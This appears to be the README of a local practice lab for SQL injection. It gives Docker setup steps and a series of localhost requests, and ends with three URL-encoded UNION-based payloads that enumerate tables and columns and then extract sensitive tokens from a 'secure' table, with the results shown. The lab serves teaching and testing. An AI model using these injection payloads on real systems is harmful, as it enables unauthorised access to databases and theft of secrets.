# practical-sql-injection-test

## RUN

```shell
docker-compose up --build
```

## Prepare

```shell
cd src
./init.sh
```

## SQL Injection test

### Check standard
Listed public names

* http://localhost:8000/inject/list

```json
["hoge","foo","fuga"]
```

### Check standard item
Get set the item

* http://localhost:8000/inject/list/hoge

```json
["hoge"]
```

### Check not found
Check not found request

* http://localhost:8000/inject/list/foofoo

```json
{"detail":"Not found"}
```

### SQL Injection
#### Get tables
Get table list with injection

* http://localhost:8000/inject/list/'%20union%20all%20SELECT%20Table_name%20as%20TablesName%20from%20information_schema.tables%20where%20table_type%20%3D%20'BASE%20TABLE'%3B%20--%20'

```json
["public","secure"]
```

#### Get columns of secure table
Get columns of secure table

* http://localhost:8000/inject/list/'%20union%20all%20select%20column_name%20from%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20TABLE_NAME%3D'secure'%3B%20--%20'

```json
["token"]
```

#### Get tokens in secure table
Get tokens in the secure table, the token is sensitive data

* http://localhost:8000/inject/list/'%20union%20all%20select%20token%20from%20secure%3B%20--%20'


```json
["c2dbf691-4275-47a5-a392-c64aa7fa3c2d","f4d78ea1-ded7-436e-8c89-984b93552d91","442744cc-62cb-41a5-b3b4-6bc90d9c5951"]
```
